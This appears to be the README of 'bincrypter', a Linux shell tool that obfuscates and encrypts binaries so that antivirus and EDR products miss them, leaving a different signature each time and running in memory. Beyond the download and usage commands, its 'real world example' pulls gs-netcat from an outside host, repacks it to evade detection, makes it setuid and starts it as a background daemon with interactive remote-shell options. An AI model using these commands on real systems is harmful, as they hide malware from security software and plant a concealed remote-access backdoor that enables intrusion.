
## A shell script for Linux that obfuscates + encrypts + packs any binary.

- Obfuscates any ELF binary or script
- AV/EDR death: Morphing + different signature every time
- 100% in-memory. No temporary files.
- Not soiling the filesystem
- Can double or triple encrypt the same binary
- Resulting binary is heavily obfuscated (`string` shows garbage)
- Living off the Land: /bin/sh + perl + openssl
- Architecture agnostic: Works on x86_64, aarch64, arm7, mips, ...

Download:
```shell
curl -SsfL https://github.com/hackerschoice/bincrypter/raw/refs/heads/main/bincrypter.sh -o bincrypter.sh
chmod +x bincrypter.sh
```

Usage:
```shell
cp /usr/bin/id id
./bincrypter.sh id
Compressed: 68552 --> 24176 [35%]

./id
uid=0(root) gid=0(root) groups=0(root)
```

Set a custom PASSWORD (optionally):
```shell
cp /usr/bin/id id
./bincrypter.sh id foobar
Compressed: 68552 --> 23860 [34%]

./id
Enter Password: foobar
uid=0(root) gid=0(root) groups=0(root)
```

Real world example (install gs-netcat with a different signature):
```shell
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m) | ./bincrypter.sh - >gsnc
chmod +s gsnc
GS_ARGS="-ilD -s ChangeMe" ./gsnc
```



